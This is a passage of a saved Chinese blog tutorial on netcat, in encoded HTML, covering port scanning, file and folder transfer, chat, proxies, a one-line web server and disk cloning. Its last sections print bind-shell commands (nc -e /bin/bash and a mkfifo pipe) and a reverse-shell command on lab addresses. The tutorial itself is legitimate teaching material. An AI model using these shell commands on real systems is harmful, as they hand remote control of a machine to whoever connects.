+    <p>=E6=A3=80=E6=9F=A5 <code class=3D"highlighter-rouge">127.0.0.1</code=
+> =E7=9A=84 TCP =E7=AB=AF=E5=8F=A3 <code class=3D"highlighter-rouge">9324-9=
+326</code> =E6=98=AF=E5=90=A6=E5=BC=80=E5=90=AF</p>
+
+    <div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D=
+"display: none;"><a class=3D"copy"></a></div><code>  $ nc 127.0.0.1 -z 9320=
+-9330
+  Connection to 127.0.0.1 port 9325 [tcp/*] succeeded!
+</code></pre>
+    </div>
+
+    <p>=E5=8F=AF=E4=BB=A5=E7=9C=8B=E5=88=B0=E5=8F=AA=E6=9C=89 9325 =E7=AB=
+=AF=E5=8F=A3=E6=98=AF=E5=BC=80=E6=94=BE=E7=9A=84, <code class=3D"highlighte=
+r-rouge">-z 9320-9330</code> =E6=8C=87=E5=AE=9A=E4=BA=86=E6=89=AB=E6=8F=8F=
+=E7=9A=84=E7=AB=AF=E5=8F=A3=E8=8C=83=E5=9B=B4=E6=98=AF 9320 =E5=88=B0 9330<=
+/p>
+  </li>
+  <li>
+    <p>=E8=AF=A6=E7=BB=86=E5=B1=95=E7=A4=BA <code class=3D"highlighter-roug=
+e">127.0.0.1</code> =E7=9A=84 TCP =E7=AB=AF=E5=8F=A3 <code class=3D"highlig=
+hter-rouge">9324-9326</code> =E7=9A=84=E5=BC=80=E5=90=AF=E7=8A=B6=E5=86=B5,=
+ =E4=BD=BF=E7=94=A8 <code class=3D"highlighter-rouge">-v</code> =E9=80=89=
+=E9=A1=B9:</p>
+
+    <div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D=
+"display: none;"><a class=3D"copy"></a></div><code>  $ nc -v -w 2 127.0.0.1=
+ -z 9324-9326
+  nc: connectx to 127.0.0.1 port 9324 (tcp) failed: Connection refused
+  found 0 associations
+  found 1 connections:
+           1: flags=3D82&lt;CONNECTED,PREFERRED&gt;
+                  outif lo0
+                  src 127.0.0.1 port 65482
+                  dst 127.0.0.1 port 9325
+                  rank info not available
+                  TCP aux info available
+
+  Connection to 127.0.0.1 port 9325 [tcp/*] succeeded!
+  nc: connectx to 127.0.0.1 port 9326 (tcp) failed: Connection refused
+</code></pre>
+    </div>
+
+    <p>=E5=8F=AF=E4=BB=A5=E7=9C=8B=E5=88=B0=E5=8F=91=E5=87=BA=E4=BA=86=E4=
+=B8=89=E4=B8=AA=E8=AF=B7=E6=B1=82, =E5=8F=AA=E6=9C=89 9325 =E7=AB=AF=E5=8F=
+=A3=E5=A4=84=E4=BA=8E=E7=9B=91=E5=90=AC=E7=8A=B6=E6=80=81, =E5=B9=B6=E4=B8=
+=94=E6=98=BE=E7=A4=BA=E6=9B=B4=E4=B8=BA=E8=AF=A6=E7=BB=86=E7=9A=84=E8=BF=9E=
+=E6=8E=A5=E6=88=90=E5=8A=9F=E7=9A=84=E8=AF=B7=E6=B1=82=E4=BF=A1=E6=81=AF</p=
+>
+  </li>
+</ul>
+
+<h3 id=3D"=E5=8F=91=E9=80=81=E6=96=87=E4=BB=B6">=E5=8F=91=E9=80=81=E6=96=87=
+=E4=BB=B6</h3>
+
+<p>=E6=8A=8A <code class=3D"highlighter-rouge">192.168.11.2</code> =E4=B8=
+=8A=E7=9A=84=E6=96=87=E4=BB=B6 <code class=3D"highlighter-rouge">demo.tar.b=
+z2</code> =E5=8F=91=E9=80=81=E5=88=B0 <code class=3D"highlighter-rouge">192=
+.168.11.3</code>, =E5=B9=B6=E4=BF=9D=E5=AD=98=E4=B8=BA <code class=3D"highl=
+ighter-rouge">demo.tar.bz2</code>:</p>
+<ul>
+  <li>=E5=9C=A8 <code class=3D"highlighter-rouge">192.168.11.3</code> =E4=
+=B8=8A: <code class=3D"highlighter-rouge">nc -l 1234 &gt; demo.tar.bz2</cod=
+e></li>
+  <li>=E5=9C=A8 <code class=3D"highlighter-rouge">192.168.11.2</code> =E4=
+=B8=8A: <code class=3D"highlighter-rouge">nc 192.168.11.3 1234 &lt; demo.ta=
+r.bz2</code></li>
+</ul>
+
+<h3 id=3D"=E8=81=8A=E5=A4=A9=E5=B7=A5=E5=85=B7">=E8=81=8A=E5=A4=A9=E5=B7=A5=
+=E5=85=B7</h3>
+
+<p>=E9=80=9A=E8=BF=87=E5=9C=A8 <code class=3D"highlighter-rouge">192.168.11=
+.2</code> =E4=B8=8E <code class=3D"highlighter-rouge">192.168.11.3</code> =
+=E4=B8=8A=E5=BB=BA=E7=AB=8B TCP =E8=BF=9E=E6=8E=A5=E6=9D=A5=E5=AE=9E=E7=8E=
+=B0=E8=81=8A=E5=A4=A9:</p>
+
+<ul>
+  <li>=E5=9C=A8 <code class=3D"highlighter-rouge">192.168.11.3</code> =E4=
+=B8=8A: <code class=3D"highlighter-rouge">nc -l 1234</code></li>
+  <li>=E5=9C=A8 <code class=3D"highlighter-rouge">192.168.11.2</code> =E4=
+=B8=8A: <code class=3D"highlighter-rouge">nc 192.168.11.2 1234</code></li>
+</ul>
+
+<p>=E8=BF=99=E6=A0=B7, =E5=8F=8C=E6=96=B9=E5=B0=B1=E5=8F=AF=E4=BB=A5=E7=9B=
+=B8=E4=BA=92=E4=BA=A4=E6=B5=81=E4=BA=86, =E4=BD=BF=E7=94=A8 <code class=3D"=
+highlighter-rouge">Ctrl+C</code> =E9=80=80=E5=87=BA</p>
+
+<h3 id=3D"=E8=BF=9E=E6=8E=A5-memcached">=E8=BF=9E=E6=8E=A5 memcached</h3>
+
+<p>=E8=BF=9E=E6=8E=A5 <code class=3D"highlighter-rouge">memcached</code> =
+=E6=9C=8D=E5=8A=A1=E5=99=A8, =E6=89=A7=E8=A1=8C=E5=91=BD=E4=BB=A4: =E5=81=
+=87=E8=AE=BE <code class=3D"highlighter-rouge">192.168.11.2</code> =E4=B8=
+=8A=E5=90=AF=E5=8A=A8=E4=BA=86=E4=B8=80=E4=B8=AA <code class=3D"highlighter=
+-rouge">memcached</code>, =E5=B9=B6=E4=B8=94=E7=AB=AF=E5=8F=A3=E4=B8=BA <co=
+de class=3D"highlighter-rouge">11211</code></p>
+
+<p>=E8=BF=9E=E6=8E=A5 192.168.11.2 =E4=B8=8A=E7=9A=84 memcached =E6=9C=8D=
+=E5=8A=A1, =E5=B9=B6=E6=89=A7=E8=A1=8C stats =E6=89=93=E5=8D=B0 memcached =
+=E8=BF=90=E8=A1=8C=E7=8A=B6=E6=80=81:</p>
+
+<div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D"dis=
+play: none;"><a class=3D"copy"></a></div><code>$ echo 'stats' | nc 192.168.=
+11.2 11211
+</code></pre>
+</div>
+
+<p>=E5=85=85=E5=BD=93=E4=B8=80=E4=B8=AA memecached =E5=AE=A2=E6=88=B7=E7=AB=
+=AF, =E4=BD=A0=E5=8F=AF=E4=BB=A5=E6=89=A7=E8=A1=8C memcached =E7=9A=84=E6=
+=93=8D=E4=BD=9C=E6=8C=87=E4=BB=A4:</p>
+
+<div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D"dis=
+play: none;"><a class=3D"copy"></a></div><code>$ nc 192.168.11.2 11211
+</code></pre>
+</div>
+
+<h3 id=3D"=E4=BD=BF=E7=94=A8=E4=BB=A3=E7=90=86">=E4=BD=BF=E7=94=A8=E4=BB=A3=
+=E7=90=86</h3>
+
+<p>=E6=9C=89=E4=BA=9B=E7=BD=91=E7=BB=9C=E4=B8=8D=E8=83=BD=E7=9B=B4=E6=8E=A5=
+=E8=AE=BF=E9=97=AE, =E5=8F=AA=E8=83=BD=E9=80=9A=E8=BF=87=E4=BB=A3=E7=90=86=
+=E6=9C=8D=E5=8A=A1=E6=89=8D=E8=83=BD=E8=AE=BF=E9=97=AE</p>
+
+<p>=E9=80=9A=E8=BF=87=E4=BB=A3=E7=90=86=E8=BF=9E=E6=8E=A5 <code class=3D"hi=
+ghlighter-rouge">host.example.com</code> =E7=9A=84 42 =E7=AB=AF=E5=8F=A3:</=
+p>
+
+<div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D"dis=
+play: none;"><a class=3D"copy"></a></div><code>	# =E4=BD=BF=E7=94=A8 HTTP =
+=E4=BB=A3=E7=90=86 http://10.2.3.4:8080 =E4=B8=8E host.example.com =E7=9A=
+=84 42 =E7=AB=AF=E5=8F=A3=E8=BF=9E=E6=8E=A5
+	$ nc -x10.2.3.4:8080 -Xconnect host.example.com 42
+
+	# =E4=BD=BF=E7=94=A8 socks4 =E4=BB=A3=E7=90=86 socks4://10.2.3.4:8080 =E8=
+=BF=9E=E6=8E=A5 host.example.com =E7=9A=84 42 =E7=AB=AF=E5=8F=A3
+	$ nc -x10.2.3.4:8080 -X4 host.example.com 42
+
+	# =E4=BD=BF=E7=94=A8 socks5 =E4=BB=A3=E7=90=86 socks5://10.2.3.4:8080 =E8=
+=BF=9E=E6=8E=A5 host.example.com =E7=9A=84 42 =E7=AB=AF=E5=8F=A3
+	$ nc -x10.2.3.4:8080 -X5 host.example.com 42
+</code></pre>
+</div>
+
+<p>ssh =E4=BD=BF=E7=94=A8=E4=BB=A3=E7=90=86: =E5=9C=A8 ssh =E7=9A=84=E9=85=
+=8D=E7=BD=AE=E6=96=87=E4=BB=B6<code class=3D"highlighter-rouge">~/.ssh/conf=
+ig</code> =E9=85=8D=E7=BD=AE=E9=80=89=E9=A1=B9 <code class=3D"highlighter-r=
+ouge">ProxyCommand</code></p>
+
+<div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D"dis=
+play: none;"><a class=3D"copy"></a></div><code>	Host web
+		HostName    192.168.11.2
+		IdentityFile ~/.ssh/id_rsa
+		Port        22
+		User        root
+		ProxyCommand nc -x127.0.0.1:7070 %h %p
+</code></pre>
+</div>
+
+<h3 id=3D"=E4=B8=80=E6=AC=A1=E6=80=A7-web-server">=E4=B8=80=E6=AC=A1=E6=80=
+=A7 Web Server</h3>
+
+<p>=E7=9B=91=E5=90=AC 8080 =E7=AB=AF=E5=8F=A3, =E5=A6=82=E6=9E=9C=E9=80=9A=
+=E8=BF=87 http =E8=AE=BF=E9=97=AE, =E5=88=99=E8=BF=94=E5=9B=9E=E6=96=87=E4=
+=BB=B6 <code class=3D"highlighter-rouge">file</code> =E7=9A=84=E5=86=85=E5=
+=AE=B9, =E7=84=B6=E5=90=8E=E6=96=AD=E5=BC=80:</p>
+
+<div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D"dis=
+play: none;"><a class=3D"copy"></a></div><code>	{ printf 'HTTP/1.0 200 OK\r=
+\nContent-Length: %d\r\n\r\n' "$(wc -c &lt; file)"; cat file; } | nc -l 808=
+0"&gt;)"}
+</code></pre>
+</div>
+
+<h3 id=3D"=E6=96=87=E4=BB=B6=E5=A4=B9=E4=BC=A0=E8=BE=93">=E6=96=87=E4=BB=B6=
+=E5=A4=B9=E4=BC=A0=E8=BE=93</h3>
+
+<p>=E9=85=8D=E5=90=88 tar =E5=91=BD=E4=BB=A4=E5=92=8C=E7=AE=A1=E9=81=93, =
+=E5=9C=A8=E4=B8=A4=E5=8F=B0=E4=B8=BB=E6=9C=BA=E4=B9=8B=E9=97=B4=E4=BC=A0=E8=
+=BE=93=E6=96=87=E4=BB=B6=E5=A4=B9=E5=86=85=E5=AE=B9</p>
+
+<p>=E6=8A=8A <code class=3D"highlighter-rouge">192.168.11.2</code> =E7=9A=
+=84=E6=96=87=E4=BB=B6=E5=A4=B9 <code class=3D"highlighter-rouge">dir</code>=
+ =E5=8F=91=E5=BE=80 <code class=3D"highlighter-rouge">192.168.11.3</code></=
+p>
+
+<ul>
+  <li>=E5=9C=A8 192.168.11.2 =E4=B8=8A: <code class=3D"highlighter-rouge">t=
+ar -cvf - dir | nc -l 1234</code></li>
+  <li>=E5=9C=A8 192.168.11.3 =E4=B8=8A: <code class=3D"highlighter-rouge">n=
+c 192.168.11.2 1234 | tar xvf -</code></li>
+</ul>
+
+<p>=E4=BD=BF=E7=94=A8 tar =E7=9A=84 <code class=3D"highlighter-rouge">-j</c=
+ode> =E9=80=89=E9=A1=B9(<code class=3D"highlighter-rouge">bzip2</code>) =E6=
+=88=96 <code class=3D"highlighter-rouge">z</code> =E9=80=89=E9=A1=B9(<code =
+class=3D"highlighter-rouge">gzip</code>) =E8=BF=9B=E8=A1=8C=E6=95=B0=E6=8D=
+=AE=E5=8E=8B=E7=BC=A9=E4=BC=A0=E8=BE=93</p>
+
+<h3 id=3D"=E8=BF=9C=E7=A8=8B=E5=85=8B=E9=9A=86=E7=A3=81=E7=9B=98">=E8=BF=9C=
+=E7=A8=8B=E5=85=8B=E9=9A=86=E7=A3=81=E7=9B=98</h3>
+
+<p>=E9=85=8D=E5=90=88 dd =E5=91=BD=E4=BB=A4=E5=92=8C=E7=AE=A1=E9=81=93, =E8=
+=BF=9B=E8=A1=8C=E8=BF=9C=E7=A8=8B=E7=A3=81=E7=9B=98=E8=AF=BB=E5=86=99</p>
+
+<p>=E6=8A=8A <code class=3D"highlighter-rouge">192.168.11.2</code> =E4=B8=
+=8A=E7=9A=84 <code class=3D"highlighter-rouge">/dev/sda</code> =E5=85=8B=E9=
+=9A=86=E5=88=B0 <code class=3D"highlighter-rouge">192.168.11.3</code> =E4=
+=B8=8A=E7=9A=84 <code class=3D"highlighter-rouge">/dev/sdb</code>:</p>
+
+<ul>
+  <li>=E5=9C=A8 192.168.11.2 =E4=B8=8A: <code class=3D"highlighter-rouge">d=
+d if=3D/dev/sda | nc -l 1234</code></li>
+  <li>=E5=9C=A8 192.168.11.3 =E4=B8=8A: <code class=3D"highlighter-rouge">n=
+c 192.168.11.2 1234 | dd of=3D/dev/sdb</code></li>
+</ul>
+
+<h3 id=3D"shell">shell</h3>
+
+<p>=E5=8F=AF=E4=BB=A5=E6=89=93=E5=BC=80=E4=B8=80=E4=B8=AA=E8=BF=9C=E7=A8=8B=
+=E4=B8=BB=E6=9C=BA=E7=9A=84 bash, =E5=AF=B9=E8=BF=9C=E7=A8=8B=E4=B8=BB=E6=
+=9C=BA=E8=BF=9B=E8=A1=8C=E6=93=8D=E4=BD=9C</p>
+
+<p>=E4=BB=8E=E6=9C=AC=E5=9C=B0=E8=BF=9C=E7=A8=8B=E6=89=93=E5=BC=80 <code cl=
+ass=3D"highlighter-rouge">192.168.11.3</code> =E7=9A=84 shell:</p>
+
+<ul>
+  <li>=E5=9C=A8 192.168.11.3 =E4=B8=8A: <code class=3D"highlighter-rouge">n=
+c -l 1234 -e /bin/bash</code></li>
+  <li>=E5=9C=A8=E6=9C=AC=E5=9C=B0: <code class=3D"highlighter-rouge">nc 192=
+.168.11.3 1234</code></li>
+</ul>
+
+<p>=E5=A6=82=E6=9E=9C=E4=B8=8D=E6=94=AF=E6=8C=81 <code class=3D"highlighter=
+-rouge">-e</code> =E6=88=96 <code class=3D"highlighter-rouge">-c</code> =E9=
+=80=89=E9=A1=B9, =E5=8F=AF=E4=BB=A5=E8=BF=99=E6=A0=B7=E5=81=9A:</p>
+<ul>
+  <li>
+    <p>=E5=9C=A8 192.168.11.3 =E4=B8=8A:</p>
+
+    <div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D=
+"display: none;"><a class=3D"copy"></a></div><code>  $ mkfifo /tmp/tmp_fifo
+  $ cat /tmp/tmp_fifo | /bin/sh 2&gt;&amp;1 | nc -l 1234 &gt; /tmp/tmp_fifo
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>=E5=9C=A8=E6=9C=AC=E5=9C=B0: <code class=3D"highlighter-rouge">nc 19=
+2.168.11.3 1234</code></p>
+  </li>
+</ul>
+
+<h3 id=3D"=E5=8F=8D=E5=90=91-shell">=E5=8F=8D=E5=90=91 shell</h3>
+
+<p>=E5=9C=A8=E6=9C=8D=E5=8A=A1=E7=AB=AF=E8=AE=BF=E9=97=AE=E5=AE=A2=E6=88=B7=
+=E7=AB=AF=E7=9A=84 shell</p>
+
+<p>=E6=9C=8D=E5=8A=A1=E5=99=A8 <code class=3D"highlighter-rouge">192.168.11=
+.2</code> =E8=AE=BF=E9=97=AE=E6=9C=AC=E5=9C=B0 shelk:</p>
+
+<ul>
+  <li>=E5=9C=A8=E6=9C=8D=E5=8A=A1=E5=99=A8=E4=B8=8A: <code class=3D"highlig=
+hter-rouge">nc -l 1234</code></li>
+  <li>=E5=9C=A8=E6=9C=AC=E6=9C=BA: <code class=3D"highlighter-rouge">nc 192=
+.168.11.2 1234 -e /bin/bash</code></li>
+</ul>
+
+    <hr>
+    <div class=3D"pagination">
+      <ul>
+     =20
+        <li class=3D"prev">=E4=B8=8A=E4=B8=80=E7=AF=87: <a href=3D"https://=
+www.ifmicro.com/2017/11/19/percent-with-the-largest-remainder-method/" titl=
+e=3D"=E4=BD=BF=E7=94=A8=E6=9C=80=E5=A4=A7=E4=BD=99=E9=A2=9D=E6=B3=95=E8=AE=
+=A1=E7=AE=97=E7=99=BE=E5=88=86=E6=AF=94">=E4=BD=BF=E7=94=A8=E6=9C=80=E5=A4=
+=A7=E4=BD=99=E9=A2=9D=E6=B3=95=E8=AE=A1=E7=AE=97=E7=99=BE=E5=88=86=E6=AF=94=
+</a></li>
+     =20
+     =20
+        <li class=3D"next-disabled">=E4=B8=8B=E4=B8=80=E7=AF=87: =E8=AE=A9=
+=E6=97=B6=E9=97=B4=E5=8A=A0=E9=80=9F=E5=90=A7
+     =20
+      </li></ul>
+    </div>
+
+    <hr>
+
+    <div id=3D"to_comments">
+   =20
+
+
+  <div id=3D"disqus_thread"></div>
+
+
+<a href=3D"http://disqus.com/" class=3D"dsq-brlink">blog comments powered b=
+y <span class=3D"logo-disqus">Disqus</span></a>
+
+
+
+
+
+    </div>
+ </div>
+
+        </div>
+      </main>
+      <footer class=3D"site-footer">
+        <div class=3D"site-wrapper clearfix">
+          <p>=C2=A92014-2020 <a href=3D"https://www.ifmicro.com/%E8%AE%B0%E=
+5%BD%95/2017/12/12/netcat-usage/">=E5=80=98=E8=8B=A5=E5=BE=AE=E5=B0=8F</a><=
+br>
+Powered by <a href=3D"https://jekyllrb.com/">jekyll</a> | Hosted by <a href=
+=3D"https://github.com/">github</a> | Designed by <a href=3D"https://www.if=
+micro.com/%E8%AE%B0%E5%BD%95/2017/12/12/netcat-usage/">MwumLi</a><br>
+=E6=9C=AC=E7=AB=99=E9=87=87=E7=94=A8 <a rel=3D"license" href=3D"http://crea=
+tivecommons.org/licenses/by-nc/4.0/">=E7=9F=A5=E8=AF=86=E5=85=B1=E4=BA=AB =
+=E7=BD=B2=E5=90=8D-=E9=9D=9E=E5=95=86=E4=B8=9A=E6=80=A7=E4=BD=BF=E7=94=A8 4=
+.0 =E5=9B=BD=E9=99=85 =E8=AE=B8=E5=8F=AF=E5=8D=8F=E8=AE=AE</a>=E8=BF=9B=E8=
+=A1=8C=E8=AE=B8=E5=8F=AF=E3=80=82</p>
+
+        </div>
+      </footer>
+
+      <div class=3D"sidebar-toggle">
+  <div id=3D"sidebar-toggle-wrapper" class=3D"sidebar-toggle-line-wrap">
+    <span class=3D"sidebar-toggle-line sidebar-toggle-line-first"></span>
+    <span class=3D"sidebar-toggle-line sidebar-toggle-line-middle"></span>
+    <span class=3D"sidebar-toggle-line sidebar-toggle-line-last"></span>
+  </div>
+</div>
+<aside id=3D"sidebar" class=3D"sidebar">
+  <div style=3D"position: fixed; height: 100%;" id=3D"js-"></div>
+  <div class=3D"sidebar-inner">
+    <ul class=3D"sidebar-nav">
+      <li class=3D"js-sidebar-toc sidebar-active" data-nav=3D"js-sidebar-to=
+c">
+        =E6=96=87=E7=AB=A0=E7=9B=AE=E5=BD=95
+      </li>
+      <li class=3D"js-sidebar-overview" data-nav=3D"js-sidebar-overview">
+        =E7=AB=99=E7=82=B9=E5=AF=BC=E8=88=AA
+      </li>
+      </ul>
+  </div>
+  <section class=3D"sidebar-panel js-sidebar-toc-spy js-sidebar-toc sidebar=
+-active">
+  <ul id=3D"markdown-toc" class=3D"nav" style=3D"max-height: 828px;">
+  <li class=3D""><a href=3D"https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/2017=
+/12/12/netcat-usage/#%E9%80%89%E9%A1%B9" id=3D"markdown-toc-=E9=80=89=E9=A1=
+=B9">=E9=80=89=E9=A1=B9</a></li>
+  <li class=3D""><a href=3D"https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/2017=
+/12/12/netcat-usage/#%E4%BD%BF%E7%94%A8" id=3D"markdown-toc-=E4=BD=BF=E7=94=
+=A8">=E4=BD=BF=E7=94=A8</a>    <ul>
+      <li class=3D""><a href=3D"https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/=
+2017/12/12/netcat-usage/#%E5%BB%BA%E7%AB%8B%E5%8E%9F%E5%A7%8B-tcp-%E8%BF%9E=
+%E6%8E%A5" id=3D"markdown-toc-=E5=BB=BA=E7=AB=8B=E5=8E=9F=E5=A7=8B-tcp-=E8=
+=BF=9E=E6=8E=A5">=E5=BB=BA=E7=AB=8B=E5=8E=9F=E5=A7=8B TCP =E8=BF=9E=E6=8E=
+=A5</a></li>
+      <li class=3D""><a href=3D"https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/=
+2017/12/12/netcat-usage/#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F" id=3D"markdo=
+wn-toc-=E7=AB=AF=E5=8F=A3=E6=89=AB=E6=8F=8F">=E7=AB=AF=E5=8F=A3=E6=89=AB=E6=
+=8F=8F</a></li>
+      <li class=3D""><a href=3D"https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/=
+2017/12/12/netcat-usage/#%E5%8F%91%E9%80%81%E6%96%87%E4%BB%B6" id=3D"markdo=
+wn-toc-=E5=8F=91=E9=80=81=E6=96=87=E4=BB=B6">=E5=8F=91=E9=80=81=E6=96=87=E4=
+=BB=B6</a></li>
+      <li class=3D""><a href=3D"https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/=
+2017/12/12/netcat-usage/#%E8%81%8A%E5%A4%A9%E5%B7%A5%E5%85%B7" id=3D"markdo=
+wn-toc-=E8=81=8A=E5=A4=A9=E5=B7=A5=E5=85=B7">=E8=81=8A=E5=A4=A9=E5=B7=A5=E5=
+=85=B7</a></li>
+      <li class=3D""><a href=3D"https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/=
+2017/12/12/netcat-usage/#%E8%BF%9E%E6%8E%A5-memcached" id=3D"markdown-toc-=
+=E8=BF=9E=E6=8E=A5-memcached">=E8=BF=9E=E6=8E=A5 memcached</a></li>
+      <li class=3D""><a href=3D"https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/=
+2017/12/12/netcat-usage/#%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%90%86" id=3D"markdo=
+wn-toc-=E4=BD=BF=E7=94=A8=E4=BB=A3=E7=90=86">=E4=BD=BF=E7=94=A8=E4=BB=A3=E7=
+=90=86</a></li>
+      <li class=3D""><a href=3D"https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/=
+2017/12/12/netcat-usage/#%E4%B8%80%E6%AC%A1%E6%80%A7-web-server" id=3D"mark=
+down-toc-=E4=B8=80=E6=AC=A1=E6=80=A7-web-server">=E4=B8=80=E6=AC=A1=E6=80=
+=A7 Web Server</a></li>
+      <li class=3D""><a href=3D"https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/=
+2017/12/12/netcat-usage/#%E6%96%87%E4%BB%B6%E5%A4%B9%E4%BC%A0%E8%BE%93" id=
+=3D"markdown-toc-=E6=96=87=E4=BB=B6=E5=A4=B9=E4=BC=A0=E8=BE=93">=E6=96=87=
+=E4=BB=B6=E5=A4=B9=E4=BC=A0=E8=BE=93</a></li>
+      <li class=3D""><a href=3D"https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/=
+2017/12/12/netcat-usage/#%E8%BF%9C%E7%A8%8B%E5%85%8B%E9%9A%86%E7%A3%81%E7%9=
+B%98" id=3D"markdown-toc-=E8=BF=9C=E7=A8=8B=E5=85=8B=E9=9A=86=E7=A3=81=E7=
+=9B=98">=E8=BF=9C=E7=A8=8B=E5=85=8B=E9=9A=86=E7=A3=81=E7=9B=98</a></li>
+      <li><a href=3D"https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/2017/12/12/=
+netcat-usage/#shell" id=3D"markdown-toc-shell">shell</a></li>
+      <li class=3D""><a href=3D"https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/=
+2017/12/12/netcat-usage/#%E5%8F%8D%E5%90%91-shell" id=3D"markdown-toc-=E5=
+=8F=8D=E5=90=91-shell">=E5=8F=8D=E5=90=91 shell</a></li>
+    </ul>
+  </li>
+</ul></section>
+  <section class=3D"sidebar-panel js-sidebar-overview">
+    <nav class=3D"sidebar-nav">
+     =20
+
+
+
+<a class=3D"page-link " href=3D"https://www.ifmicro.com/micro-say/2020/">=
+=E5=BE=AE=E8=AF=AD</a>
+
+
+
+<a class=3D"page-link " href=3D"https://www.ifmicro.com/pages/archive/">=E5=
+=BD=92=E6=A1=A3</a>
+
+
+
+<a class=3D"page-link " href=3D"https://www.ifmicro.com/pages/categories/">=
+=E5=88=86=E7=B1=BB</a>
+
+
+
+<a class=3D"page-link " href=3D"https://www.ifmicro.com/pages/tags/">=E6=A0=
+=87=E7=AD=BE</a>
+
+
+
+<a class=3D"page-link " href=3D"https://www.ifmicro.com/rss.xml">=E8=AE=A2=
+=E9=98=85</a>
+
+
+
+    </nav>
+  </section>
+</aside>
+
+      <div class=3D"back-to-top">
+        <div class=3D"back-to-top-wrap">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+      </div>
+    </div>
+       =20
+
+
+ =20
+
+
+
+
+
+       =20
+
+
+
+ =20
+ =20
+ =20
+
+ =20
+ =20
+ =20
+
+ =20
+ =20
+ =20
+
+ =20
+ =20
+ =20
+
+ =20
+ =20
+ =20
+
+
+
+       =20
+       =20
+
+
+ =20
+ =20
+   =20
+
+
+
+ =20
+
+ =20
+
+ =20
+
+ =20
+ =20
+  <link rel=3D"stylesheet" href=3D"https://www.ifmicro.com/assets/css/bigfo=
+ot-number.css?2.1.4" type=3D"text/css">
+ =20
+ =20
+
+ =20
+ =20
+  <link rel=3D"stylesheet" href=3D"https://www.ifmicro.com/assets/lib/fancy=
+box/source/jquery.fancybox.css?2.1.5" type=3D"text/css">
+ =20
+ =20
+
+
+
+ =20
+ =20
+ =20
+
+ =20
+ =20
+ =20
+
+ =20
+ =20
+ =20
+
+ =20
+ =20
+ =20
+
+ =20
+ =20
+ =20
+
+ =20
+ =20
+ =20
+
+
+   =20
+    <div style=3D"position: fixed; height: 100%; opacity: 0;" id=3D"body-di=
+v"></div>
+
+
+
+<div style=3D"position: fixed; left: 0px; top: 0px; height: 5px; z-index: 9=
+99999; background: yellow; transition: width 0.3s ease-out 0s; --darkreader=
+-inline-bgimage: initial; --darkreader-inline-bgcolor:#b9b913; width: 0%;" =
+data-darkreader-inline-bgimage=3D"" data-darkreader-inline-bgcolor=3D""></d=
+iv><div id=3D"goog-gt-tt" class=3D"skiptranslate" dir=3D"ltr"><div style=3D=
+"padding: 8px;"><div><div class=3D"logo"><img src=3D"https://www.gstatic.co=
+m/images/branding/product/1x/translate_24dp.png" width=3D"20" height=3D"20"=
+ alt=3D"Google =E7=BF=BB=E8=AF=91"></div></div></div><div class=3D"top" sty=
+le=3D"padding: 8px; float: left; width: 100%;"><h1 class=3D"title gray">=E5=
+=8E=9F=E6=96=87</h1></div><div class=3D"middle" style=3D"padding: 8px;"><di=
+v class=3D"original-text"></div></div><div class=3D"bottom" style=3D"paddin=
+g: 8px;"><div class=3D"activity-links"><span class=3D"activity-link">=E6=8F=
+=90=E4=BE=9B=E6=9B=B4=E5=A5=BD=E7=9A=84=E7=BF=BB=E8=AF=91=E5=BB=BA=E8=AE=AE=
+</span><span class=3D"activity-link"></span></div><div class=3D"started-act=
+ivity-container"><hr style=3D"color: rgb(204, 204, 204); background-color: =
+rgb(204, 204, 204); height: 1px; border: none; --darkreader-inline-color:#9=
+d9a92; --darkreader-inline-bgcolor:#9d9a92; --darkreader-inline-border-top:=
+ initial; --darkreader-inline-border-right: initial; --darkreader-inline-bo=
+rder-bottom: initial; --darkreader-inline-border-left: initial;" data-darkr=
+eader-inline-color=3D"" data-darkreader-inline-bgcolor=3D"" data-darkreader=
+-inline-border-top=3D"" data-darkreader-inline-border-right=3D"" data-darkr=
+eader-inline-border-bottom=3D"" data-darkreader-inline-border-left=3D""><di=
+v class=3D"activity-root"></div></div></div><div class=3D"status-message" s=
+tyle=3D"display: none;"></div></div><st-div id=3D"__selection-translator__"=
+> <st-div class=3D"__st-box__" style=3D"display: none; position: fixed; z-i=
+ndex: 99999; left: 0px; top: 0px; transform: translateX(0px) translateY(0px=
+);"> <st-header> <st-span class=3D"st-icon-pin" title=3D"=E5=9B=BA=E5=AE=9A=
+"></st-span> <st-span class=3D"st-icon-down-open" title=3D"=E5=B1=95=E5=BC=
+=80"></st-span> <st-span class=3D"st-icon-cog" title=3D"=E8=AE=BE=E7=BD=AE"=
+></st-span> </st-header> <st-div class=3D"__query-form__" style=3D"display:=
+ none;"> <st-div> <textarea placeholder=3D"=E8=BE=93=E5=85=A5=E8=A6=81=E7=
+=BF=BB=E8=AF=91=E7=9A=84=E5=8F=A5=E5=AD=90=E6=88=96=E5=8D=95=E8=AF=8D"></te=
+xtarea> </st-div> <st-div> <select> <option value=3D"">=E8=87=AA=E5=8A=A8=
+=E5=88=A4=E6=96=AD</option> <option value=3D"zh">=E4=B8=AD=E6=96=87</option=
+><option value=3D"zh-CN">=E4=B8=AD=E6=96=87(=E7=AE=80=E4=BD=93)</option><op=
+tion value=3D"zh-HK">=E4=B8=AD=E6=96=87(=E9=A6=99=E6=B8=AF)</option><option=
